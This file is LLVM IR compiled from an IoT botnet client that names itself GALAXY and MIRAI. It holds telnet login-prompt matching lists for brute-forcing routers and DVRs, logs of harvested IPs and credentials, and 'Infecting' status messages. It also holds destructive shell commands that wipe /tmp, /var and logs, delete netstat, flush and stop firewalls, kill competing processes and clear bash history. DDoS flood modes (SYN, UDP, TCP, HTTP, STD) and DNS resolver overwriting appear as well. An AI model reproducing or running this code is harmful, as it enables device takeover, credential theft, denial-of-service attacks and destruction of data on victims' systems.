@.str.426 = private unnamed_addr constant [7 x i8] c"sawvqb\00", align 1
@.str.427 = private unnamed_addr constant [7 x i8] c"xxwkvy\00", align 1
@.str.428 = private unnamed_addr constant [7 x i8] c"hcgguc\00", align 1
@.str.429 = private unnamed_addr constant [7 x i8] c"tlrgju\00", align 1
@.str.430 = private unnamed_addr constant [7 x i8] c"yfdieg\00", align 1
@.str.431 = private unnamed_addr constant [7 x i8] c"kuvikr\00", align 1
@.str.432 = private unnamed_addr constant [7 x i8] c"kgymka\00", align 1
@.str.433 = private unnamed_addr constant [7 x i8] c"bxdusa\00", align 1
@.str.434 = private unnamed_addr constant [7 x i8] c"kmijih\00", align 1
@.str.435 = private unnamed_addr constant [7 x i8] c"cmnupe\00", align 1
@.str.436 = private unnamed_addr constant [7 x i8] c"jkuruo\00", align 1
@.str.437 = private unnamed_addr constant [7 x i8] c"hnqdok\00", align 1
@.str.438 = private unnamed_addr constant [7 x i8] c"vxemfi\00", align 1
@.str.439 = private unnamed_addr constant [7 x i8] c"xzdlvy\00", align 1
@Temp_Directorys = global [13 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.441, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.442, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.443, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.444, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.445, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.446, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.447, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.448, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.449, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.450, i32 0, i32 0), i8* null], align 16
@.str.440 = private unnamed_addr constant [7 x i8] c"/tmp/*\00", align 1
@.str.441 = private unnamed_addr constant [7 x i8] c"/var/*\00", align 1
@.str.442 = private unnamed_addr constant [11 x i8] c"/var/run/*\00", align 1
@.str.443 = private unnamed_addr constant [11 x i8] c"/var/tmp/*\00", align 1
@.str.444 = private unnamed_addr constant [16 x i8] c"/dev/netslink/*\00", align 1
@.str.445 = private unnamed_addr constant [7 x i8] c"/dev/*\00", align 1
@.str.446 = private unnamed_addr constant [11 x i8] c"/dev/shm/*\00", align 1
@.str.447 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.448 = private unnamed_addr constant [8 x i8] c"/boot/*\00", align 1
@.str.449 = private unnamed_addr constant [7 x i8] c"/usr/*\00", align 1
@.str.450 = private unnamed_addr constant [7 x i8] c"/opt/*\00", align 1
@advances = global [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.456, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.457, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.458, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.459, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.460, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.461, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.463, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.464, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.465, i32 0, i32 0), i8* null], align 16
@.str.451 = private unnamed_addr constant [8 x i8] c"mdm9625\00", align 1
@.str.452 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@.str.453 = private unnamed_addr constant [5 x i8] c"F600\00", align 1
@.str.454 = private unnamed_addr constant [5 x i8] c"F660\00", align 1
@.str.455 = private unnamed_addr constant [5 x i8] c"F609\00", align 1
@.str.456 = private unnamed_addr constant [4 x i8] c"BCM\00", align 1
@.str.457 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.458 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.459 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.460 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.461 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.462 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.463 = private unnamed_addr constant [5 x i8] c"nter\00", align 1
@.str.464 = private unnamed_addr constant [5 x i8] c"User\00", align 1
@.str.465 = private unnamed_addr constant [8 x i8] c"welcome\00", align 1
@fails = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.466, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.471, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.472, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.473, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.474, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.475, i32 0, i32 0), i8* null], align 16
@.str.466 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.467 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.468 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.469 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.470 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.471 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.472 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.473 = private unnamed_addr constant [7 x i8] c"ailure\00", align 1
@.str.474 = private unnamed_addr constant [4 x i8] c"bye\00", align 1
@.str.475 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@successes = global [18 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.477, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.478, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.480, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.481, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.482, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.483, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.484, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.456, i32 0, i32 0), i8* null], align 16
@.str.476 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.477 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.478 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.479 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.480 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@.str.481 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.482 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.483 = private unnamed_addr constant [8 x i8] c"command\00", align 1
@.str.484 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.466, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.471, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.472, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.477, i32 0, i32 0), i8* null], align 16
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.575 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.485 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.486 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.487 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.488 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.489 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.490 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.491 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.492 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.493 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.494 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.495 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.496 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.497 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.498 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.499 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.500 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.501 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.502 = private unnamed_addr constant [72 x i8] c"[ GALAXY ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.503 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.504 = private unnamed_addr constant [91 x i8] c"[ GALAXY ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.505 = private unnamed_addr constant [27 x i8] c"pkill -9 %s;killall -9 %s;\00", align 1
@.str.506 = private unnamed_addr constant [78 x i8] c"[ GALAXY ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.507 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.508 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.509 = private unnamed_addr constant [75 x i8] c"[ GALAXY ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.510 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.511 = private unnamed_addr constant [85 x i8] c"[ GALAXY ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.512 = private unnamed_addr constant [72 x i8] c"[ GALAXY ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.513 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [24 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.514, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.515, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.516, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.517, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.518, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.519, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.520, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.521, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.522, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.523, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.524, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.525, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.526, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.527, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.528, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.529, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.530, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.531, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.532, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.533, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.534, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.535, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.536, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.537, i32 0, i32 0)], align 16
@.str.514 = private unnamed_addr constant [21 x i8] c"PozHlpiND4xPDPuGE6tq\00", align 1
@.str.515 = private unnamed_addr constant [21 x i8] c"tg57YSAcuvy2hdBlEWMv\00", align 1
@.str.516 = private unnamed_addr constant [21 x i8] c"VaDp3Vu5m5bKcfCU96RX\00", align 1
@.str.517 = private unnamed_addr constant [21 x i8] c"UBWcPjIZOdZ9IAOSZAy6\00", align 1
@.str.518 = private unnamed_addr constant [21 x i8] c"JezacHw4VfzRWzsglZlF\00", align 1
@.str.519 = private unnamed_addr constant [21 x i8] c"3zOWSvAY2dn9rKZZOfkJ\00", align 1
@.str.520 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.521 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.522 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.523 = private unnamed_addr constant [21 x i8] c"kKbPlhAwlxxnyfM3LaL0\00", align 1
@.str.524 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.525 = private unnamed_addr constant [21 x i8] c"yFnlmG7bqbW682p7Bzey\00", align 1
@.str.526 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.527 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.528 = private unnamed_addr constant [21 x i8] c"bOAFqQfhvMFEf9jEZ89M\00", align 1
@.str.529 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.530 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.531 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.532 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.533 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.534 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.535 = private unnamed_addr constant [21 x i8] c"lgKjMnqBZFEvPJKpRmMj\00", align 1
@.str.536 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.537 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.538 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.539 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.540 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.541 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.542 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.543 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.544 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.545 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.546 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.547 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.548 = private unnamed_addr constant [5 x i8] c"SREP\00", align 1
@.str.549 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.550 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.551 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.552 = private unnamed_addr constant [21 x i8] c"[SREP] FLoad Mode ON\00", align 1
@.str.553 = private unnamed_addr constant [6 x i8] c"MIRAI\00", align 1
@.str.554 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.555 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.556 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.557 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.558 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.559 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.560 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.561 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.562 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.566 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.563 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.564 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.570 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.571 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.572 = private unnamed_addr constant [53 x i8] c"[\1B[96mINFECTED\1B[97m] Arch: \1B[96m%s \1B[97m|| Type: %s]\00", align 1
@.str.573 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.574 = private unnamed_addr constant [2 x i8] c" \00", align 1
@getRandomPublicIP.ipState.0 = internal unnamed_addr global i8 0, align 1
@getRandomPublicIP.ipState.1 = internal unnamed_addr global i8 0, align 1
@getRandomPublicIP.ipState.2 = internal unnamed_addr global i8 0, align 1
@getRandomPublicIP.ipState.3 = internal unnamed_addr global i8 0, align 1
@MiraiIPRanges.ipState.0 = internal unnamed_addr global i8 0, align 1
@MiraiIPRanges.ipState.1 = internal unnamed_addr global i8 0, align 1
@MiraiIPRanges.ipState.2 = internal unnamed_addr global i8 0, align 1
@MiraiIPRanges.ipState.3 = internal unnamed_addr global i8 0, align 1

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0)
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #1 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #1 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8** nocapture readonly) local_unnamed_addr #2 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %indvars.iv13 = phi i64 [ %indvars.iv.next14, %3 ], [ 0, %2 ]
  %indvars.iv.next14 = add nuw nsw i64 %indvars.iv13, 1
  %4 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv.next14
  %5 = load i8*, i8** %4, align 8
  %6 = icmp eq i8* %5, null
  br i1 %6, label %.preheader, label %3

.preheader:                                       ; preds = %3
  %7 = trunc i64 %indvars.iv13 to i32
  %8 = icmp slt i32 %7, 0
  br i1 %8, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  %sext = shl i64 %indvars.iv13, 32
  %9 = ashr exact i64 %sext, 32
  br label %.lr.ph

; <label>:10:                                     ; preds = %.lr.ph
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %11 = icmp slt i64 %indvars.iv, %9
  br i1 %11, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %12 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %0, i8* %13) #7
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %10, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %10
  %.09.ph = phi i32 [ 0, %10 ], [ 1, %.lr.ph ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.09 = phi i32 [ 0, %.preheader ], [ %.09.ph, %._crit_edge.loopexit ]
  ret i32 %.09
}

declare i32 @strcasestr(...) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) local_unnamed_addr #2 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) local_unnamed_addr #2 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) local_unnamed_addr #2 {
  %2 = tail call i32 @contains_success(i8* %0)
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %7

; <label>:4:                                      ; preds = %1
  %5 = tail call i32 @contains_fail(i8* %0)
  %6 = icmp ne i32 %5, 0
  br label %7

; <label>:7:                                      ; preds = %1, %4
  %8 = phi i1 [ true, %1 ], [ %6, %4 ]
  %9 = zext i1 %8 to i32
  ret i32 %9
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) local_unnamed_addr #2 {
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 0, i64* %7, align 8
  %8 = sext i32 %1 to i64
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 %8, i64* %9, align 8
  %10 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #7, !srcloc !1
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.fd_set* nonnull %5, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* nonnull %6) #7
  %22 = icmp slt i32 %21, 1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %4
  %24 = sext i32 %3 to i64
  %25 = call i64 @recv(i32 %0, i8* %2, i64 %24, i32 0) #7
  %26 = trunc i64 %25 to i32
  br label %27

; <label>:27:                                     ; preds = %4, %23
  %.0 = phi i32 [ %26, %23 ], [ 0, %4 ]
  ret i32 %.0
}

